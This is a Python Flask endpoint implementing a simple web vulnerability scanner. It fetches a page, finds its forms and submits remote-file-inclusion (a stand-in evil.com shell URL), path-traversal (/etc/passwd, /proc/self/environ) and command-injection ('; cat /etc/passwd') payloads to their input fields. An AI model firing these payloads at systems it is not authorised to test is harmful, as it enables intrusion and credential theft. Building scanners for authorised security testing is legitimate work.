from flask import Blueprint, request, jsonify
import requests
from bs4 import BeautifulSoup
from flask_cors import CORS

vuln_blueprint = Blueprint("vulnerability", __name__)
CORS(vuln_blueprint, resources={r"/*": {"origins": "http://localhost:5173"}})


# قائمة الثغرات لاختبارها
payloads = {
    "RFI": [
        "http://evil.com/shell.txt",
        "https://example.com/../../../../../../etc/passwd",
    ],
    "LFI": [
        "../../../../../../etc/passwd",
        "../../../../../../etc/hosts",
        "../../../../../../proc/self/environ",
    ],
    "Command Injection": [
        "; ls -la",
        "; cat /etc/passwd",
        "&& ls -la",
        "&& cat /etc/passwd",
    ],
}


@vuln_blueprint.route("/scan", methods=["POST"])
def scan():
    data = request.get_json()
    url = data.get("url")

    if not url:
        return jsonify({"error": "URL is required"}), 400

    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, "html.parser")
        forms = soup.find_all("form")

        if not forms:
            return jsonify({"message": "No forms found on the page."})

        results = []
        for form in forms:
            action = form.get("action")
            method = form.get("method", "get").lower()
            inputs = form.find_all("input")
            form_url = url if not action or action == "#" else action

            for vuln_type, payload_list in payloads.items():
                for payload in payload_list:
                    data = {}
                    for input_tag in inputs:
                        input_name = input_tag.get("name")
                        input_type = input_tag.get("type")
                        if input_name:
                            data[input_name] = (
                                payload if input_type in ["text", "search"] else "test"
                            )

                    result = (
                        requests.post(form_url, data=data)
                        if method == "post"
                        else requests.get(form_url, params=data)
                    )

                    if (
                        "root:" in result.text
                        or "command" in result.text.lower()
                        or "error" in result.text.lower()
                    ):
                        results.append(
                            {
                                "vulnerability": vuln_type,
                                "payload": payload,
                                "status": "Vulnerable",
                            }
                        )

        return jsonify({"results": results})
    except Exception as e:
        return jsonify({"error": str(e)}), 500
